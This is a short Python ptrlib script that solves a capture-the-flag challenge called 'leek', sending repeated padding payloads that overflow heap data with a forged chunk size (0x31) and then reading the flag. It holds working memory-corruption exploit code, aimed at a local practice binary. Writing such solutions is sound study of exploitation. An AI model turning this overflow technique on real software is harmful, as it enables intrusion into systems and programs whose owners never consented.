#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./leek_patched")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    for i in range(0x64):
        io.sendline(b"A" * 8 * 8)
        io.sendline(b"A" * 0x20 + b"A" * 8 * 3 + ptr.p64(0x31))

    io.recvuntil(b"Looks like you made it through.\n")
    ptr.logger.info(f"flag = {io.recvline().decode()}")


if __name__ == "__main__":
    main()
